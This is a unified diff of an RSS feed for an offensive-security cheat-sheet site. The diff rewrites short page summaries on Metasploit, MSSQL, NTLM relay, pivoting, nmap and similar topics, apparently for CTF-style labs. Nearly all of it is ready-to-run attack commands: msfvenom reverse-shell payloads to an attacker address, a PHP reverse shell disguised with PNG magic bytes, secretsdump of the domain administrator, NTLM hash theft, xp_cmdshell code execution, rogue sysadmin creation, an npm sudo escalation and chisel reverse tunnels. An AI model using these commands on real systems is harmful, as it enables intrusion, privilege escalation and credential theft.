@@ -551,35 +537,35 @@
       <link>https://tldrbins.github.io/machine_account/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/machine_account/</guid>
-      <description> Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache&#xA;python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 3. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator </description>
+      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 3. Convert kirbi to ccache python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 4. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache&#xA;TO-DO</description>
     </item>
     <item>
       <title>Magic Bytes</title>
       <link>https://tldrbins.github.io/magic_bytes/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/magic_bytes/</guid>
-      <description> png echo &amp;#39;89 50 4E 47 0D 0A 1A 0A&amp;#39; | xxd -p -r &amp;gt;&amp;gt; php-reverse-shell.php.png cat php-reverse-shell.php &amp;gt;&amp;gt; php-reverse-shell.php.png </description>
+      <description> Forge File Signature png echo &amp;#39;89 50 4E 47 0D 0A 1A 0A&amp;#39; | xxd -p -r &amp;gt;&amp;gt; php-reverse-shell.php.png cat php-reverse-shell.php &amp;gt;&amp;gt; php-reverse-shell.php.png </description>
     </item>
     <item>
       <title>memcache</title>
       <link>https://tldrbins.github.io/memcache/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/memcache/</guid>
-      <description> Connect Using Telnet # Connect telnet 127.0.0.1 11211 Using memcached-cli # Install sudo npm install -g memcached-cli # Connect (With Creds) memcached-cli &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@10.10.11.10:11211 Basic Commmands # Info about slabs stats slabs # Show slab info (e.g. slab 1 and display all keys) stats cachedump 1 0 # Dump info get &amp;lt;ITEM_NAME&amp;gt; </description>
+      <description> Connect telnet memcached-cli # Connect telnet 127.0.0.1 11211 # Install sudo npm install -g memcached-cli # Connect (With Creds) memcached-cli &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@10.10.11.10:11211 Basic Commmands # Info about slabs stats slabs # Show slab info (e.g. slab 1 and display all keys) stats cachedump 1 0 # Dump info get &amp;lt;ITEM_NAME&amp;gt; </description>
     </item>
     <item>
       <title>Memory Dump</title>
       <link>https://tldrbins.github.io/memory_dump/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/memory_dump/</guid>
-      <description> binwalk Download binwalk&#xA;# Extract files from memory dump binwalk -M -e memory.dmp Mini Dump pypykatz lsa minidump memory.dmp </description>
+      <description> Tools binwalk pypykatz # Extract files from memory dump binwalk -M -e memory.dmp Ref: binwalk&#xA;# Mini Dump pypykatz lsa minidump memory.dmp </description>
     </item>
     <item>
       <title>Metasploit</title>
       <link>https://tldrbins.github.io/metasploit/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit/</guid>
-      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
+      <description>msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>Metasploit Listener</title>
@@ -593,35 +579,35 @@
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
-      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+      <description>Generate Shellcode Note: stageless payload can catch with nc directly&#xA;Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Windows x86 Staged exe Stageless exe # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.</description>
     </item>
     <item>
       <title>Microsoft Access Database</title>
       <link>https://tldrbins.github.io/microsoft_access_database/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/microsoft_access_database/</guid>
-      <description> Tool sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo &amp;#34;$table: $lines&amp;#34;; fi; done # Dump data from table mdb-export database.mdb &amp;lt;TABLE_NAME&amp;gt; </description>
+      <description> Tools mdbtools sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo &amp;#34;$table: $lines&amp;#34;; fi; done # Dump data from table mdb-export database.mdb &amp;lt;TABLE_NAME&amp;gt; </description>
     </item>
     <item>
       <title>Microsoft Oulook Email Folder</title>
       <link>https://tldrbins.github.io/microsoft_outlook/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/microsoft_outlook/</guid>
-      <description>Open .pst file Tool sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Use mutt mutt -Rf emails.mbox +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Open .</description>
+      <description>Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Install mutt sudo apt install mutt # Open in mutt terminal mutt -Rf emails.mbox +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Tools # Install msgconvert sudo apt install libemail-outlook-message-perl # Install formail sudo apt install procmail Basic # Convert to .</description>
     </item>
     <item>
       <title>MongoDB General</title>
       <link>https://tldrbins.github.io/mongodb_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mongodb_general/</guid>
-      <description> General Connect to Mongo Database mongo 10.10.11.10:27017 # Connect local with creds and specified database mongo -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; &amp;lt;DB_NAME&amp;gt; Basic Commands # Show all databases show dbs # Choose database use &amp;lt;DB_NAME&amp;gt; # Show all collections show collections # Show all of the collection db.&amp;lt;COLLECTION_NAME&amp;gt;.find().pretty() # Insert entry into collections db.&amp;lt;COLLECTION_NAME&amp;gt;.insert({&amp;#34;&amp;lt;key&amp;gt;&amp;#34;: &amp;#34;&amp;lt;value&amp;gt;&amp;#34;}) # Update an entry (e.g. password of user) db.&amp;lt;COLLECTION_NAME&amp;gt;.update({&amp;#34;username&amp;#34;: &amp;#34;user&amp;#34;}, {$set: {&amp;#34;password&amp;#34;: &amp;#34;password&amp;#34;}}); </description>
+      <description> General Connect to Mongo Database anonymous authenticate mongo 10.10.11.10:27017 # Connect local with creds and specified database mongo -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; &amp;lt;DB_NAME&amp;gt; Basic Commands # Show all databases show dbs # Choose database use &amp;lt;DB_NAME&amp;gt; # Show all collections show collections # Show all of the collection db.&amp;lt;COLLECTION_NAME&amp;gt;.find().pretty() # Insert entry into collections db.&amp;lt;COLLECTION_NAME&amp;gt;.insert({&amp;#34;&amp;lt;key&amp;gt;&amp;#34;: &amp;#34;&amp;lt;value&amp;gt;&amp;#34;}) # Update an entry (e.g. password of user) db.&amp;lt;COLLECTION_NAME&amp;gt;.update({&amp;#34;username&amp;#34;: &amp;#34;user&amp;#34;}, {$set: {&amp;#34;password&amp;#34;: &amp;#34;password&amp;#34;}}); </description>
     </item>
     <item>
       <title>Mount Share</title>
       <link>https://tldrbins.github.io/share_mount/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/share_mount/</guid>
-      <description>NFS List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Unmount share sudo umount /mnt/share/ Others # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +-----------------------------------------------------------------------------------------+ | root_squash : running as root on local system will be treated as nobody user in target | | no_all_squash: every other users permission will translate from local system to target | +-----------------------------------------------------------------------------------------+ # Add dummy user sudo useradd dummy # Change uid sudo usermod -u 1001 dummy # Switch to dummy user sudo su dummy -c bash SMB Mount share sudo mount -t cifs //10.</description>
+      <description> nfs smb List share showmount -e 10.10.11.10 Mount share sudo mount -t nfs 10.10.11.10:/share /mnt/share/ Unmount share sudo umount /mnt/share/ Mount share sudo mount -t cifs //10.10.11.10/share /mnt # Without creds sudo mount -t cifs -o user=,password= //10.10.11.10/share /mnt # With creds sudo mount -t cifs -o user=&amp;lt;USER&amp;gt;,pass=&amp;lt;PASSWORD&amp;gt; //10.10.11.10/share /mnt Mount inside Windows # Mount net use \\localhost\c$ /u:&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt; &amp;lt;PASSWORD&amp;gt; # Check dir \\localhost\c$\users\administrator\desktop Abuse #1: Misconfigured Share # Check all mounted drives mount # Check how shares are mounted cat /etc/exports +-----------------------------------------------------------------------------------------+ | root_squash : running as root on local system will be treated as nobody user in target | | no_all_squash: every other users permission will translate from local system to target | +-----------------------------------------------------------------------------------------+ # Add dummy user sudo useradd dummy # Change uid sudo usermod -u 1001 dummy # Switch to dummy user sudo su dummy -c bash </description>
     </item>
     <item>
       <title>MSSQL Agent Jobs</title>
@@ -635,21 +621,21 @@
       <link>https://tldrbins.github.io/mssql_general/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_general/</guid>
-      <description>General Connect to MSSQL DB (From Linux) impacket-mssqlclient &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; Connect to MSSQL DB (From Windows) # With inline query sqlcmd -S &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; -P &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DB_NAME&amp;gt; -Q &amp;#34;SELECT @@version;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
+      <description>General Connect to MSSQL DB Linux Windows impacket-mssqlclient &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # With inline query sqlcmd -S &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; -P &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DB_NAME&amp;gt; -Q &amp;#34;SELECT @@version;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
     </item>
     <item>
       <title>MSSQL Linked Servers</title>
       <link>https://tldrbins.github.io/mssql_linked_server/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
-      <description> Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN &amp;lt;USER&amp;gt; WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] </description>
+      <description> Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN &amp;lt;USER&amp;gt; WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] </description>
     </item>
     <item>
       <title>MSSQL Privilege Escalation</title>
       <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
-      <description>Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or load_file(&amp;#39;\\10.10.14.10\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
+      <description>Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 Method 1 Method 2 Method 3 xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; load_file(&amp;#39;\\10.10.14.10\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
     </item>
     <item>
       <title>Mysql General</title>
@@ -670,21 +656,21 @@
       <link>https://tldrbins.github.io/nxc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nxc/</guid>
-      <description>nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # Single user and password (Active Directory) nxc smb -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; # Multiple users or passwords nxc smb -u usernames.txt -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.</description>
+      <description>Basic Commands # Single user and password nxc smb 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # Single user and password (Active Directory) nxc smb -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; # Multiple users or passwords nxc smb -u usernames.txt -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.</description>
     </item>
     <item>
       <title>Network Discovery</title>
       <link>https://tldrbins.github.io/network_discovery/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/network_discovery/</guid>
-      <description>Test Connectivity ping -c3 10.10.11.10 # Windows Test-NetConnection dc1 -Port 5985 Test Reverse Connectivity sudo tcpdump -ni tun0 icmp Sniff Network Traffic # For example: on port 389 tcpdump -i lo -nnXs 0 &amp;#39;port 389&amp;#39; mitmproxy&#xA;# Sniff HTTPS traffic sudo ./mitmdump -p 443 --mode reverse:https://example.com --ssl-insecure --set flow_detail=3 Use ping to Scan Subnet for i in $(seq 1 254); do (ping -c 1 10.100.10.${i} | grep &amp;#34;bytes from&amp;#34; &amp;amp;); done; Use nc to Scan Ports for i in $(seq 1 65535); do (nc -zvn 127.</description>
+      <description>Test connectivity Linux Windows # Default infinite pings ping -c3 10.10.11.10 # Default 5 pings ping 10.10.11.10 # Check specific port Test-NetConnection &amp;lt;TARGET&amp;gt; -Port 5985 Test reverse connectivity Linux sudo tcpdump -ni tun0 icmp Sniff network traffic Linux # For example: on port 389 sudo tcpdump -i lo -nnXs 0 &amp;#39;port 389&amp;#39; # Sniff HTTPS traffic sudo ./mitmdump -p 443 --mode reverse:https://example.com --ssl-insecure --set flow_detail=3 Ref: mitmproxy&#xA;Use ping to scan subnet Linux for i in $(seq 1 254); do (ping -c 1 10.</description>
     </item>
     <item>
       <title>Network Traffic Pivoting</title>
       <link>https://tldrbins.github.io/network_traffic_privoting/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/network_traffic_privoting/</guid>
-      <description>Chisel Download chisel&#xA;Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .</description>
+      <description>Tunneling Chisel ssh socat metasploit sliver Start a local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 Ports forwarding # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 Socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .</description>
     </item>
     <item>
       <title>Nginx</title>
@@ -698,35 +684,35 @@
       <link>https://tldrbins.github.io/nmap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nmap/</guid>
-      <description>Nmap Port Scan TCP Scan target=10.10.11.10 nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sCV -oA ./nmap-tcpscripts $target UDP Scan (common ports) target=10.10.11.10 nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Scan with nmap scripts Update scripts DB nmap --script-updatedb Search scripts nmap --script-help ftp* Scan with a script nmap --script=ftp-anon -sV -sC -p 21 10.</description>
+      <description>Nmap Scan TCP UDP Script target=10.10.11.10 nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sCV -oA ./nmap-tcpscripts $target target=10.10.11.10 nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Update scripts DB nmap --script-updatedb Search scripts nmap --script-help ftp* Scan with a script nmap --script=ftp-anon -sV -sC -p 21 10.</description>
     </item>
     <item>
       <title>npm</title>
       <link>https://tldrbins.github.io/npm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/npm/</guid>
-      <description> SUDO Create a package.json&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
+      <description> SUDO Create a &amp;lsquo;package.json&amp;rsquo;&#xA;{ &amp;#34;name&amp;#34;: &amp;#34;root&amp;#34;, &amp;#34;version&amp;#34;: &amp;#34;1.0.0&amp;#34;, &amp;#34;scripts&amp;#34;: { &amp;#34;preinstall&amp;#34;: &amp;#34;/bin/bash&amp;#34; } } mkdir test mv package.json test/ sudo npm i test/ --unsafe </description>
     </item>
     <item>
       <title>NTLM Relay Attack</title>
       <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
-      <description>1. Run socat to redirect traffic (In Windows Target) socat&#xA;# Upload socat.zip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
+      <description>1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
